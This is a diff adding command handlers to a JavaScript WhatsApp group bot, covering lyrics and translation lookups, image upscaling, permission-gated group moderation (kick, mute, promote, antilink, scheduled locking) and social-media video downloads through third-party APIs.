+        m.reply(`❌ Failed to process media. Please try again.`);
+    }
+}
+break
+
+case 'lyrics': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+    if (!text) return m.reply("❌ *Please provide a song name.*");
+     try {
+        const apiUrl = `https://draculaZyx-xyzdrac.hf.space/api/Lyrics/?text=${encodeURIComponent(q)}`;
+        const response = await axios.get(apiUrl);
+        const { artist, song_name, thumbnail, lyrics } = response.data;
+
+        let caption = `🎶 *Lyrics Found!* 🎶\n\n`;
+        caption += `🎤 *Artist:* ${artist}\n`;
+        caption += `🎵 *Song:* ${song_name}\n\n`;
+        caption += `📜 *Lyrics:*\n${lyrics}`;
+
+        await ednut.sendMessage(m.chat, { image: { url: thumbnail }, caption: caption }, { quoted: m });
+    } catch (error) {
+        console.error("Error fetching lyrics:", error);
+        m.reply("❌ Error fetching lyrics. Please try again later.");
+    }
+} 
+break;
+
+
+//================================================================================
+
+case "tr": case "translate": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+let language
+let teks
+let defaultLang = "en"
+if (text || m.quoted) {
+let translate = require('translate-google-api')
+if (text && !m.quoted) {
+if (args.length < 2) return m.reply(example("en good night"))
+language = args[0]
+teks = text.split(" ").slice(1).join(' ')
+} else if (m.quoted) {
+if (!text) return m.reply(example("en good night"))
+if (args.length < 1) return m.reply(example("en good night"))
+if (!m.quoted.text) return m.reply(example("en good night"))
+language = args[0]
+teks = m.quoted.text
+}
+let result
+try {
+result = await translate(`${teks}`, {to: language})
+} catch (e) {
+result = await translate(`${teks}`, {to: defaultLang})
+} finally {
+m.reply(result[0])
+}
+} else {
+return m.reply(example("en good night"))
+}}
+break
+
+//================================================================================
+
+case "tohd": case "hd": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+try {
+    let q = m.quoted ? m.quoted : m
+    let mime = (q.msg || q).mimetype || ''
+    
+    if (!mime.startsWith('image/')) return m.reply('Please send pictures with caption *hd/remini* or reply pictures!!')
+
+    let media = await q.download()
+    if (!media) return m.reply('Failed to download image..')
+
+    let upscaledUrl = await upscale(media)
+    if (!upscaledUrl) return m.reply('Failed to HD image')
+
+    await ednut.sendMessage(m.chat, {
+      image: { url: upscaledUrl },
+      caption: `© ᴀʀᴄʜ ᴍᴅ ²⁵`
+    }, { quoted: m })
+
+  } catch (error) {
+    await ednut.reply(m.chat, `*Error:* ${error.message}`, m)
+  }
+}
+break
+
+//================================================================================
+case "add": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isOwner) return m.reply(msg.owner)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+let input;
+if (m.quoted) {
+input = m.quoted.sender;
+} else if (text) {
+input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
+} else {
+return m.reply(example("234### or reply to the user's message"))
+}
+var onWa = await ednut.onWhatsApp(input.split("@")[0])
+if (onWa.length < 1) return m.reply("input a valid whatsapp number")
+const metadata = await ednut.groupMetadata(m.chat)
+const members = metadata.participants.map(p => p.id)
+if (members.includes(input)) {
+return m.reply(`${input.split("@")[0]} is already in the group.`)
+} else {
+await ednut.groupParticipantsUpdate(m.chat, [input], 'add')
+return m.reply(`User ${input.split("@")[0]} added to the group chat`)
+}
+} 
+break
+//================================================================================
+
+case "kick": case "fling": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!m.isGroup) return m.reply(msg.group)
+  if (!isOwner && !isAdmins) return m.reply(msg.admin)
+  if (!isBotAdmins) return m.reply(msg.botAdmin)
+  if (text || m.quoted) {
+    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
+    var onWa = await ednut.onWhatsApp(input.split("@")[0])
+    if (onWa.length < 1) return m.reply("Input a valid WhatsApp number")
+    const metadata = await ednut.groupMetadata(m.chat)
+    const members = metadata.participants.map(p => p.id)
+    if (!members.includes(input)) {
+      await m.reply(`User ${input.split("@")[0]} is not in the group.`)
+    } else {
+      const res = await ednut.groupParticipantsUpdate(m.chat, [input], 'remove')
+      await m.reply(`User ${input.split("@")[0]} removed from the group chat.`)
+    }
+  } else {
+    return m.reply(example("@tag/reply"))
+  }
+} 
+break
+//================================================================================
+
+case "leave": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!isOwner) return m.reply(msg.owner)
+  if (!m.isGroup) return m.reply(msg.group)
+  await sleep(2000)
+  await ednut.groupLeave(m.chat)
+} 
+break
+
+case "resetlinkgc":  
+case "revoke": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (!isOwner && !isAdmins) return m.reply(msg.admin)
+await ednut.groupRevokeInvite(m.chat)
+m.reply("Group link reset successfully ✅")
+}
+break
+
+//================================================================================
+case 'tagall': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!m.isGroup) return m.reply(msg.group)
+  if (!isBotAdmins) return m.reply(msg.botAdmin)
+  if (!isOwner && !isAdmins) return m.reply(msg.admin)
+let teks = `Message : ${text ? text : 'none'}\n\n`
+for (let mem of participants) {
+teks += `${global.simbol} @${mem.id.split('@')[0]}\n`
+}
+await ednut.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+}
+break
+
+case 'tagadmin': case 'listadmin': case 'admin':{
+if (!isGroup) return reply(msg.group)
+const groupAdmins = participants.filter(p => p.admin)
+const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
+const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
+    let text = `   
+${listAdmin}
+`.trim()
+await ednut.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
+}
+break
+
+//================================================================================
+
+case "linkgc": 
+case "grouplink":  {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+const urlGrup = "https://chat.whatsapp.com/" + await ednut.groupInviteCode(m.chat)
+var teks = `
+${urlGrup}
+`
+await ednut.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
+}
+break
+
+//================================================================================
+
+case "joingc": case "join": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (!text) return m.reply(example("group link"))
+if (!text.includes("chat.whatsapp.com")) return m.reply("the given link is invalid")
+let result = text.split('https://chat.whatsapp.com/')[1]
+let id = await ednut.groupAcceptInvite(result)
+m.reply(`Successfully joined the group`)
+}
+break
+
+//================================================================================
+
+case "get": case "g": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (!text) return m.reply(example("https://example.com"))
+let data = await fetchJson(text)
+m.reply(JSON.stringify(data, null, 2))
+}
+break
+
+//================================================================================
+
+//================================================================================
+
+case "mute":
+case "close": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!m.isGroup) return m.reply(msg.group)
+  if (!isBotAdmins) return m.reply(msg.botAdmin)
+  if (!isOwner && !isAdmins) return m.reply(msg.admin)
+  if (groupMetadata.announce == false) {
+    await ednut.groupSettingUpdate(m.chat, 'announcement')
+    m.reply(`Group has been muted!`)
+  } else {
+    m.reply(`Group is already muted!`)
+  }
+} 
+break;
+
+case "unmute":
+case "open": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!m.isGroup) return m.reply(msg.group)
+  if (!isBotAdmins) return m.reply(msg.botAdmin)
+  if (!isOwner && !isAdmins) return m.reply(msg.admin)
+  if (groupMetadata.announce == true) {
+    await ednut.groupSettingUpdate(m.chat, 'not_announcement')
+    m.reply(`Group has been opened!`)
+  } else {
+    m.reply(`Group is already open!`)
+  }
+} 
+break;
+
+
+//================================================================================
+
+
+case "ednut": case "creator": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+await ednut.sendContact(m.chat, ['2347036214381'], m)
+}
+break
+
+
+//================================================================================
+
+case "ping": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+let timestamp = speed();
+let latensi = speed() - timestamp;
+let tio = await nou.os.oos();
+var tot = await nou.drive.info();
+m.reply('_checking response..._')
+await sleep(2000)
+let respon = `_*• pong:* ${latensi.toFixed(4)} sec_`
+await m.reply(respon)
+}
+break
+
+//================================================================================
+
+case "addsudo": case "setsudo": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (m.quoted || text) {
+let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
+if (setsudo.includes(orang)) return m.reply(`_User ${orang.split('@')[0]} existed as a sudo before_`)
+await setsudo.push(orang)
+await fs.writeFileSync("./all/database/owner.json", JSON.stringify(setsudo))
+m.reply(`_succesfully added ${orang.split('@')[0]} as a sudo number_`)
+} else {
+return m.reply(example("/@tag/234XXX/reply to chat"))
+}}
+break
+
+case "delsudo": case "removesudo":  {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (m.quoted || text) {
+let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
+if (!setsudo.includes(orang)) return m.reply(`_User ${orang.split('@')[0]} not founded as a sudo before_`)
+let indx = setsudo.indexOf(orang)
+await setsudo.splice(indx, 1)
+await fs.writeFileSync("./all/database/owner.json", JSON.stringify(setsudo))
+m.reply(`_succesfully deleted ${orang.split('@')[0]} from sudo number_`)
+} else {
+return m.reply(example("@tag/234XXX/reply to chat"))
+}}
+break
+
+case "listsudo": case "getsudo": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (setsudo.length < 1) return m.reply("No sudo Number yet in Arch")
+let teksnya = `Sudo Number here\n`
+setsudo.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
+await ednut.sendMessage(m.chat, {text: teksnya, mentions: [... setsudo]}, {quoted: m})
+}
+break
+
+case 'request':{
+				if (!m.isGroup) return m.reply(msg.group);
+				if (!isBotAdmins) return m.reply(msg.botAdmin);
+				if (!isAdmins) return m.reply(msg.admin);
+				const response = await ednut.groupRequestParticipantsList(m.chat);
+				if (!response || !response.length) {
+					ednut.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
+					return;
+				}
+				let replyMessage = `Join Request List:\n`;
+				response.forEach((request, index) => {
+					const { jid, request_method, request_time } = request;
+					const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
+					replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
+					replyMessage += `\n*JID:* ${jid}`;
+					replyMessage += `\n*Method:* ${request_method}`;
+					replyMessage += `\n*Time:* ${formattedTime}\n`;
+				});
+				ednut.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
+			};
+			break
+
+case 'approve': {
+if (m.isGroup) {
+  if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+try {
+       if (!m.isGroup) return m.reply(msg.group)
+	 if (!isBotAdmins) return await m.reply(msg.botAdmin)
+     if (!isAdmins) return message.reply(msg.admin)
+     const total = await ednut.groupRequestParticipantsList(m.chat);
+     if (!total || !total[0]) {
+       return await m.reply("No pending participant Yet");
+     }
+     let reqs2 = [];
+     let mssg = "Accepted user\n\n";
+     for (let i = 0; i < total.length; i++) {
+       try {
+         await ednut.groupRequestParticipantsUpdate(m.chat, [total[i].jid], "approve");
+         mssg += "@" + total[i].jid.split("@")[0] + "\n";
+         reqs2 = [...reqs2, total[i].jid];
+       } catch {}
+     }
+    await ednut.sendMessage(m.chat, {
+       text: mssg,
+       mentions: [reqs2]
+     });
+   } catch (err) {
+     await m.reply(err.toString());
+   }
+   }
+ break
+ 
+case "kickall":
+if (m.isGroup) {
+  if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (!isAdmins || !isOwner) return m.reply(msg.admin)
+let users = participants.filter((u) => !areJidsSameUser(u.id, ednut.user.id)); 
+   let kickedUser = []; 
+   for (let user of users) { 
+     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
+       await kickedUser.push(user.id); 
+       await sleep(1 * 1000); 
+     } 
+   } 
+   if (!kickedUser.length >= 1) 
+     return m.reply("In this group there are no members except you and me"); 
+   const res = await ednut.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
+   await sleep(3000); 
+   await m.reply( 
+     `sucessfully kicked member\n${kickedUser.map( 
+       (v) => "@" + v.split("@")[0] 
+     )}`, 
+     null, 
+     { 
+       mentions: kickedUser, 
+     } 
+   ); 
+break;
+
+case 'mode': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (args[0] === 'public') {
+if (global.db.settings.mode === false) {
+m.reply('Bot mode is already set to Public!')
+} else {
+global.db.settings.mode = false
+m.reply('Bot mode changed to Public!')
+}
+} else if (args[0] === 'private') {
+if (global.db.settings.mode  === true) {
+m.reply('Bot mode is already set to Private!')
+} else {
+global.db.settings.mode = true
+m.reply('Bot mode changed to Private!')
+}
+} else if (args[0] === 'group') {
+if (global.db.settings.onlygroup) {
+m.reply('already activated!')
+} else {
+global.db.settings.onlygroup = true
+global.db.settings.onlypc = false
+m.reply('Only group mode activated!')
+}
+} else if (args[0] === 'pc') {
+if (global.db.settings.onlypc) {
+m.reply('already activated!')
+} else {
+global.db.settings.onlypc = true
+global.db.settings.onlygroup = false
+m.reply('Only pc mode activated!')
+}
+} else if (args[0] === 'off') {
+global.db.settings.onlypc = false
+global.db.settings.onlygroup = false
+await m.reply('Succesfully deactivated only pc/ only group')
+} else {
+m.reply(example('public/private/group/pc/off'))
+}
+}
+break
+
+
+case 'demote': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins || !isOwner) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
+let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+const groupMetadata = await ednut.groupMetadata(m.chat)
+const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
+if (!groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is not an admin in this group.`)
+await ednut.groupParticipantsUpdate(m.chat, [users], 'demote')
+await m.reply(`@${users.split('@')[0]} has been dismissed as an administrator in ${groupMetadata.subject}`)
+}
+break
+
+case 'promote': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins || !isOwner) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
+let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+const groupMetadata = await ednut.groupMetadata(m.chat)
+const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
+if (groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is already an admin in this group.`)
+await ednut.groupParticipantsUpdate(m.chat, [users], 'promote')
+await m.reply(`@${users.split('@')[0]} has been promoted to an administrator in ${groupMetadata.subject}`)
+}
+break
+
+case "tag": case "hidetag": case "ht": {
+  if (m.isGroup) {
+    if (global.db.groups[m.chat].banned) return
+  }
+  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!m.isGroup) return m.reply(msg.group)
+  if (!isAdmins || !isOwner) return m.reply(msg.admin)
+  let quotedMessage = m.msg.contextInfo.quotedMessage
+  if (!quotedMessage) return m.reply(example("message or reply to chat or media"))
+  const metadata = await ednut.groupMetadata(m.chat)
+  let member = await metadata.participants.map(e => e.id)
+  if (quotedMessage) {
+    if (quotedMessage.conversation) {
+      ednut.sendMessage(m.chat, { text: quotedMessage.conversation, mentions: [...member] })
+    }
+    if (quotedMessage) {
+      if (quotedMessage.imageMessage) {
+        let imageCaption = quotedMessage.imageMessage.caption;
+        let imageUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
+        ednut.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption, mentions: [...member] });
+      }
+       if (quotedMessage) {
+      if (quotedMessage.audioMessage) {;
+        let audioUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
+        ednut.sendMessage(m.chat, {audio: {url: audioUrl}, mimetype: "audio/mpeg", mentions: [...member]}, {quoted: m})
+      }
+      if (quotedMessage.videoMessage) {
+        let videoCaption = quotedMessage.videoMessage.caption;
+        let videoUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
+        ednut.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption, mentions: [...member] });
+      }
+    }
+    }
+  }
+}
+break
+
+case 'tagadmin': case 'listadmin': case 'admin':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+const groupMetadata = await ednut.groupMetadata(m.chat)
+const groupAdmins = groupMetadata.participants.filter(p => p.admin)
+const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
+let text = `Group Admin\n${listAdmin}`.trim()
+await ednut.sendMessage(m.chat, {text, mentions: groupAdmins.map(v => v.id) }, {quoted: m})
+} 
+break
+
+case 'antilink': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (!text) return m.reply(example('<kick/delete/warn> or antilink off'))
+const action = text
+if (action === 'kick') {
+if (global.db.groups[m.chat].antilink) return m.reply('Already activated in this group')
+global.db.groups[m.chat].antilink = true
+global.db.groups[m.chat].antilink2 = false
+global.db.groups[m.chat].antilink3 = false
+await m.reply('Succesfully activated antilink to kick any link sender')
+} else if (action === 'delete') {
+if (global.db.groups[m.chat].antilink2) return m.reply('Already activated in this group')
+global.db.groups[m.chat].antilink2 = true
+global.db.groups[m.chat].antilink = false
+global.db.groups[m.chat].antilink3 = false
+await m.reply('Succesfully activated antilink to delete any sent link')
+} else if (action === 'warn') {
+if (global.db.groups[m.chat].antilink3) return m.reply('Already activated in this group')
+global.db.groups[m.chat].antilink3 = true
+global.db.groups[m.chat].antilink2 = false
+global.db.groups[m.chat].antilink = false
+await m.reply('Succesfully activated antilink to warn and delete any sent link')
+} else if (action === 'off') {
+global.db.groups[m.chat].antilink = false
+global.db.groups[m.chat].antilink2 = false
+global.db.groups[m.chat].antilink3 = false
+await m.reply('Succesfully deactivated antilink feature in this group')
+} else {
+m.reply('Invalid action the actions are warn/kick/delete!')
+}
+} 
+break
+
+case 'antibot': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (args[0] === 'on') {
+if (global.db.groups[m.chat].antibot === true) return m.reply('Antibot already enabled!')
+global.db.groups[m.chat].antibot = true
+m.reply('Antibot enabled in the group!')
+} else if (args[0] === 'off') {
+if (global.db.groups[m.chat].antibot === false) return m.reply('Antibot already disabled!')
+global.db.groups[m.chat].antibot = false
+m.reply('Auto bio disabled in the group!')
+} else {
+m.reply(example('on/off'))
+}
+}
+break;
+
+case 'closetime': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (args.length < 1) return m.reply(example("23:30"))
+if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
+let time = args[0].split(':')
+let hour = time[0]
+let minute = time[1]
+if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
+let closeTime = `${hour}:${minute}`
+console.log(`Close time: ${closeTime}`)
+if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
+global.db.groups[m.chat].muteTime = closeTime
+global.db.groups[m.chat].mute = true
+await m.reply(`Close Time set to ${args[0]} everyday. Group will auto-lock at this time.`)
+setInterval(async () => {
+let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
+if (currentTime === closeTime) {
+try {
+await ednut.groupSettingUpdate(m.chat, 'announcement')
+console.log(`Group settings updated successfully`)
+} catch (error) {
+console.error(`Error updating group settings: ${error}`)
+}
+}
+}, 60000) // check every 1 minute
+}
+break
+
+case 'opentime': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (args.length < 1) return m.reply(example("08:00"))
+if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
+let time = args[0].split(':')
+let hour = time[0]
+let minute = time[1]
+if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
+let openTime = `${hour}:${minute}`
+console.log(`Open time: ${openTime}`)
+if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
+global.db.groups[m.chat].openTime = openTime
+global.db.groups[m.chat].open = true
+await m.reply(`Open Time set to ${args[0]} everyday. Group will auto-open at this time.`)
+setInterval(async () => {
+let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
+if (currentTime === openTime) {
+try {
+await ednut.groupSettingUpdate(m.chat, 'not_announcement')
+console.log(`Group settings updated successfully`)
+} catch (error) {
+console.error(`Error updating group settings: ${error}`)
+}
+}
+}, 60000) // check every 1 minute
+}
+break
+
+case 'stoptime': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
+global.db.groups[m.chat].muteTime = null
+global.db.groups[m.chat].mute = null
+global.db.groups[m.chat].openTime = null
+global.db.groups[m.chat].open = null
+await m.reply(`Close Time and Open Time deleted successfully.`)
+}
+break
+
+case "pdm": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins || !isOwner) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (args.length < 1) return m.reply(example("on/off"))
+if (args[0] === "on") {
+if (global.db.groups[m.chat].events) return m.reply('Already on')
+global.db.groups[m.chat].events = true
+m.reply('pdm turned on successfully')
+} else if (args[0] === "off") {
+if (!global.db.groups[m.chat].events) return m.reply('Already off')
+global.db.groups[m.chat].events = false
+m.reply('pdm turned off successfully')
+}
+} 
+break
+
+case "welcome": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins || !isOwner) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (args.length < 1) return m.reply(example("on/off"))
+if (args[0] === "on") {
+if (global.db.groups[m.chat].welcome) return m.reply('Already on')
+global.db.groups[m.chat].welcome = true
+m.reply('Welcome turned on successfully')
+} else if (args[0] === "off") {
+if (!global.db.groups[m.chat].welcome) return m.reply('Already off')
+global.db.groups[m.chat].welcome = false
+m.reply('Welcome turned off successfully')
+}
+} 
+break
+
+case "goodbye": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins || !isOwner) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
+if (args.length < 1) return m.reply(example("on/off"))
+if (args[0] === "on") {
+if (global.db.groups[m.chat].goodbye) return m.reply('Already on')
+global.db.groups[m.chat].goodbye = true
+m.reply('Goodbye turned on successfully')
+} else if (args[0] === "off") {
+if (!global.db.groups[m.chat].goodbye) return m.reply('Already off')
+global.db.groups[m.chat].goodbye = false
+m.reply('Goodbye turned off successfully')
+}
+} 
+break
+
+case 'igdl': 
+case 'instagram': 
+case 'ig': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!text) return m.reply(example(`input ig link`))
+  if (!(text.includes('instagram.com') || text.includes('instagr.am') || text.includes('igtv'))) {
+    return m.reply('Input a valid Instagram link!')
+  }
+  try {
+    const result = await igdl(text)
+    if (!result || result.length === 0) {
+      return m.reply('Failed to get video. Make sure the URL entered is correct.')
+    }
+    for (let video of result) {
+      await ednut.sendFile(m.chat, video.url, 'instagram.mp4', '© ᴀʀᴄʜ ᴍᴅ²⁵.', m)
+    }
+  } catch (err) {
+    console.error(err)
+    m.reply('An error occurred while trying to download the video.')
+  }
+} 
+break
+
+case "facebook": case "fb": case "fbdl": case "fbvideo": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("facebook media link"))
+if (!(text.includes('facebook.com') || text.includes('fb.watch'))) {
+return m.reply('Input a valid Facebook link!')
+}
+try {
+let apiUrl = `https://api.agatz.xyz/api/facebook?url=${encodeURIComponent(text)}`
+let res = await fetch(apiUrl);
+if (!res.ok) throw 'Failed to fetch data from API';
+let json = await res.json();
+console.log('API Response:', json);
+if (json.status !== 200) throw 'There is an error ' + json.creator;
+let { url, hd, title, thumbnail } = json.data;
+await ednut.sendMessage(m.chat, { video: { url: hd }, caption: `*title:* ${title}\n*Thumbnail:* ${thumbnail}\n*Link:* ${url}\n\n© ᴀʀᴄʜ ᴍᴅ ²⁵` }, { quoted: m });
+} catch (error) {
+console.error(error);
+m.reply(`error`);
+}
+};
+break
+
+case "tiktok": case "tt": case "ttdl": case "tiktokdl": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example('tiktok media link'))
+let anuan = text
+if (!(text.includes('tiktok.com') || text.includes('vm.tiktok.com'))) {
+return m.reply('Input a valid TikTok link!')
+}
+await api.tiktok(anuan).then(async (res) => {
+var cap = `© ᴀʀᴄʜ ᴍᴅ ²⁵`
+if (res.result.duration == 0) {
+for (let a of res.result.images) {
+await ednut.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
+}
+} else {
+await ednut.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
+}
+}).catch(e => m.reply(`${e}`))
+} 
+break
+
+case "warn":{
+if (m.isGroup) {
+  if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!m.isGroup) return m.reply(msg.group)
+if (!isAdmins) return m.reply(msg.admin)
+if (!isBotAdmins) return m.reply(msg.botAdmin)
